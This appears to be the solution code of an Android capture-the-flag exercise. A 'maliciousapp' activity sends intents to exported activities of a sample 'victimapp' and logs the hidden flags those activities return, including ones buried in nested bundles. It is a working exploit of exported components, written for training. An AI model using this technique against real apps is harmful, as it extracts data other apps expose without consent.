package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intentOne = new Intent();
        intentOne.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartOne"));

        String CUSTOM_ACTION = "com.example.victimapp.intent.action.JUSTASK";

        Intent intentTwo = new Intent();
        intentTwo.setAction(CUSTOM_ACTION);

        Intent intentThree = new Intent();
        intentThree.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartThree"));

        String CUSTOM_ACTION_2 = "com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE";

        Intent intentFour = new Intent();
        intentFour.setAction(CUSTOM_ACTION_2);

        startActivityForResult(intentFour, 400);
        startActivityForResult(intentThree, 300);
        startActivityForResult(intentTwo, 200);
        startActivityForResult(intentOne, 100);


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //all labels are learned trough bundle2string
        if (requestCode == 100) {
            String flag1 = data.getStringExtra("flag");
            Log.d("response ", flag1);
        } else if (requestCode == 200) {
            String flag2 = data.getStringExtra("flag");
            Log.d("response2 ", flag2);
        } else if (requestCode == 300) {
            Bundle bundle = data.getExtras();
            String whatInside = bundle.getString("hiddenFlag");
            Log.d("response3 ", whatInside);
        } else if (requestCode == 400) {
            Bundle bundle = data.getBundleExtra("follow").getBundle("the value")
                    .getBundle("rabbit").getBundle("hole").getBundle("deeper");
            String whatInside = bundle.getString("never ending story");
            Log.d("response4 ", whatInside);
        } else {
            Log.d("feedback", "unexpected response");
        }
    }

    public static String bundle2string(Bundle bundle){
        if (bundle == null) {
            return null;
        }
        String string = "Bundle{";
        for (String key : bundle.keySet()) {
            string += " " + key + " => " + bundle.get(key) + ";";
        }
        string += " }Bundle";
        return string;
    }

}
